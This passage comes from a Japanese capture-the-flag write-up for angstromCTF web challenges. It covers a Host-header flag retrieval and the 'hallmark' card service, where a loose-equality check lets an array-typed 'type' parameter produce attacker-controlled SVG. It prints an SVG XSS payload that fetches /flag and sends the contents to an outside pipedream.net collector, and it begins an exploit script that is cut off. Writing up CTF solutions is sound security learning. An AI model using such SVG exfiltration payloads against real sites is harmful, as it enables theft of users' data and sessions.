+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> name <span style=color:#f92672>==</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;host&#34;</span>:
+</span></span><span style=display:flex><span>            num_hosts <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> num_hosts <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> name, value <span style=color:#f92672>in</span> headers:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> name <span style=color:#f92672>==</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;host&#34;</span> <span style=color:#f92672>and</span> value <span style=color:#f92672>==</span> SECRET_SITE:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>await</span> send({
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#39;type&#39;</span>: <span style=color:#e6db74>&#39;http.response.body&#39;</span>,
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#39;body&#39;</span>: FLAG<span style=color:#f92672>.</span>encode(),
+</span></span><span style=display:flex><span>                })
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> send({
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;type&#39;</span>: <span style=color:#e6db74>&#39;http.response.body&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;body&#39;</span>: <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Welcome to the _tunnel_. Watch your step!!&#39;</span>,
+</span></span><span style=display:flex><span>    })
+</span></span></code></pre></div><p><code>host</code>ヘッダに<code>flag.local</code>をセットすればflagが取得できるようです。</p><pre tabindex=0><code>$ curl -H &#34;host: flag.local&#34; https://pioneer.tailec718.ts.net/
+actf{reaching_the_core__chapter_8}
+</code></pre><h1 id=web-hallmark>[web] hallmark</h1><p>以下の<code>index.js</code>が与えられます。</p><p><code>Content-Type</code>が<code>text/plain</code>と<code>image/svg+xml</code>のcardを作成・更新することができます。<code>text/plain</code>のcardは任意のコンテンツを設定できますが、<code>image/svg+xml</code>のcardはあらかじめサーバに配置されているsvgファイルしか使用できません。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;express&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>bodyParser</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;body-parser&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>cookieParser</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;cookie-parser&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>path</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;path&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>v4</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>uuidv4</span>, <span style=color:#a6e22e>v4</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;uuid&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;fs&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>bodyParser</span>.<span style=color:#a6e22e>urlencoded</span>({ <span style=color:#a6e22e>extended</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span> }));
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>cookieParser</span>());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>IMAGES</span> <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>heart</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#34;./static/heart.svg&#34;</span>),
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>snowman</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#34;./static/snowman.svg&#34;</span>),
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>flowers</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#34;./static/flowers.svg&#34;</span>),
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>cake</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#34;./static/cake.svg&#34;</span>)
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Object.<span style=color:#a6e22e>freeze</span>(<span style=color:#a6e22e>IMAGES</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>port</span> <span style=color:#f92672>=</span> Number(<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>PORT</span>) <span style=color:#f92672>||</span> <span style=color:#ae81ff>8080</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>secret</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>ADMIN_SECRET</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;secretpw&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>flag</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;actf{placeholder_flag}&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>cards</span> <span style=color:#f92672>=</span> Object.<span style=color:#a6e22e>create</span>(<span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#e6db74>&#39;/static&#39;</span>, <span style=color:#a6e22e>express</span>.<span style=color:#66d9ef>static</span>(<span style=color:#e6db74>&#39;static&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/card&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>id</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>id</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>id</span>]) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>setHeader</span>(<span style=color:#e6db74>&#34;Content-Type&#34;</span>, <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>type</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>content</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;bad id&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/card&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> { <span style=color:#a6e22e>svg</span>, <span style=color:#a6e22e>content</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;text/plain&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>v4</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;post:&#34;</span>, <span style=color:#66d9ef>typeof</span>(<span style=color:#a6e22e>svg</span>), <span style=color:#a6e22e>svg</span>, <span style=color:#a6e22e>content</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>svg</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;text&#34;</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;text/plain&#34;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>] <span style=color:#f92672>=</span> { <span style=color:#a6e22e>type</span>, <span style=color:#a6e22e>content</span> }
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>] <span style=color:#f92672>=</span> { <span style=color:#a6e22e>type</span>, <span style=color:#a6e22e>content</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>IMAGES</span>[<span style=color:#a6e22e>svg</span>] }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>redirect</span>(<span style=color:#e6db74>&#34;/card?id=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>id</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;/card&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> { <span style=color:#a6e22e>id</span>, <span style=color:#a6e22e>type</span>, <span style=color:#a6e22e>svg</span>, <span style=color:#a6e22e>content</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>id</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>]){
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;bad id&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;put:&#34;</span>, <span style=color:#66d9ef>typeof</span>(<span style=color:#a6e22e>type</span>), <span style=color:#a6e22e>type</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>type</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span>, <span style=color:#a6e22e>type</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;text/plain&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>content</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>IMAGES</span>[<span style=color:#a6e22e>svg</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;heart&#34;</span>] <span style=color:#f92672>:</span> <span style=color:#a6e22e>content</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>type</span>, <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>content</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;ok&#34;</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// the admin bot will be able to access this
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/flag&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>cookies</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>cookies</span>.<span style=color:#a6e22e>secret</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>secret</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>flag</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;you can&#39;t view this &gt;:(&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>));
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>port</span>, () =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Server listening on port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>port</span><span style=color:#e6db74>}</span><span style=color:#e6db74>.`</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>cardの作成処理では、<code>svg</code>パラメータの値が<code>text</code>の場合に、<code>type</code>が<code>text/plain</code>のcardを作成します。<code>svg</code>パラメータの値が<code>text</code>の以外の場合に、<code>type</code>が<code>image/svg+xml</code>のcardを作成します。この処理は特に問題なさそうです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/card&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> { <span style=color:#a6e22e>svg</span>, <span style=color:#a6e22e>content</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;text/plain&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>v4</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;post:&#34;</span>, <span style=color:#66d9ef>typeof</span>(<span style=color:#a6e22e>svg</span>), <span style=color:#a6e22e>svg</span>, <span style=color:#a6e22e>content</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>svg</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;text&#34;</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;text/plain&#34;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>] <span style=color:#f92672>=</span> { <span style=color:#a6e22e>type</span>, <span style=color:#a6e22e>content</span> }
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>] <span style=color:#f92672>=</span> { <span style=color:#a6e22e>type</span>, <span style=color:#a6e22e>content</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>IMAGES</span>[<span style=color:#a6e22e>svg</span>] }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>redirect</span>(<span style=color:#e6db74>&#34;/card?id=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>id</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>cardの更新処理では、<code>type</code>パラメータの値が<code>image/svg+xml</code>の場合に<code>card</code>の<code>type</code>に入力の<code>type</code>パラメータの値が設定され、<code>image/svg+xml</code>でない場合に<code>card</code>の<code>type</code>に<code>text/plain</code>が設定されます。また、<code>type</code>パラメータの値が<code>image/svg+xml</code>の場合に<code>card</code>の<code>content</code>に<code>IMAGES[svg || "heart"]</code>が設定され、<code>image/svg+xml</code>でない場合に入力の<code>content</code>パラメータの値が設定されます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;/card&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> { <span style=color:#a6e22e>id</span>, <span style=color:#a6e22e>type</span>, <span style=color:#a6e22e>svg</span>, <span style=color:#a6e22e>content</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>id</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>]){
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;bad id&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;text/plain&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>content</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>IMAGES</span>[<span style=color:#a6e22e>svg</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;heart&#34;</span>] <span style=color:#f92672>:</span> <span style=color:#a6e22e>content</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;ok&#34;</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>以下の部分をよくみると、上では抽象的な等価性比較（<code>==</code>）、下では厳格な等価性比較（<code>===</code>）が使用されています。MDNのサイト[https://developer.mozilla.org/ja/docs/Web/JavaScript/Equality_comparisons_and_sameness] を参考にすると、<code>==</code>は2つの値の型が異なる場合に両方の値を共通の型に変換し、等しいかどうかを比較し、<code>===</code>は型変換を行わずに2つの値を比較します（型が異なる場合は等しくないとする）。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;text/plain&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#a6e22e>cards</span>[<span style=color:#a6e22e>id</span>].<span style=color:#a6e22e>content</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;image/svg+xml&#34;</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>IMAGES</span>[<span style=color:#a6e22e>svg</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;heart&#34;</span>] <span style=color:#f92672>:</span> <span style=color:#a6e22e>content</span>;
+</span></span></code></pre></div><p>今回は、<code>app.use(bodyParser.urlencoded({ extended: true }));</code>が設定されているため、Stringだけでなく、Objectをデータとして送信することができます。例えば<code>type</code>として<code>['image/svg+xml'] </code>のようなObjectを送信できれば、先程の上の条件式を<code>false</code>、下の条件式を<code>true</code>にでき、<code>type</code>を<code>image/svg+xml</code>とした上で任意のコンテンツを設定できます。つまり、svgを用いたXSSが可能になります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#f92672>&gt;</span> [<span style=color:#e6db74>&#39;image/svg+xml&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;image/svg+xml&#39;</span> <span style=color:#75715e>// 型変換を行う、`Array.prototype.toString()`を用いて`[&#39;image/svg+xml&#39;]`をStringに変換
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> [<span style=color:#e6db74>&#39;image/svg+xml&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;image/svg+xml&#39;</span> <span style=color:#75715e>// 型変換を行わない
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>false</span>
+</span></span></code></pre></div><p>body-parserの<a href=https://github.com/expressjs/body-parser/blob/480b1cfe29af19c070f4ae96e0d598c099f42a12/test/urlencoded.js#L138>実装</a>を参考にすると、<code>foo[0]=bar</code>のようにすると、<code>{"foo":["bar"]}</code>のようなデータが送信できそうです。</p><p>また、XSSを発火させて、Cookieを自身のサーバに送信するためのsvgとしては以下を使用します（<a href=https://infosecwriteups.com/stored-xss-using-svg-file-2e3608248fae>参考</a>）。</p><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;
+&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;
+
+&lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
+  &lt;polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/&gt;
+  &lt;script type=&#34;text/javascript&#34;&gt;
+    fetch(`https://hallmark.web.actf.co/flag`)
+    .then(async(res) =&gt; {
+        flag = await res.text();
+        fetch(`https://eon3rjzh6pnyack.m.pipedream.net?flag=${flag}`);
+    });
+  &lt;/script&gt;
+&lt;/svg&gt;
+</code></pre><p>最終的に以下のスクリプトを用いて、<code>/card</code>のPOSTとPUTを行います。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span>mport requests
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>base_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;https://hallmark.web.actf.co&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># POST /card</span>
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;svg&#34;</span>: <span style=color:#e6db74>&#34;text&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;content&#34;</span>: <span style=color:#e6db74>&#34;hugahugahugahuga&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>headers <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;Content-Type&#39;</span>: <span style=color:#e6db74>&#39;application/x-www-form-urlencoded&#39;</span>}
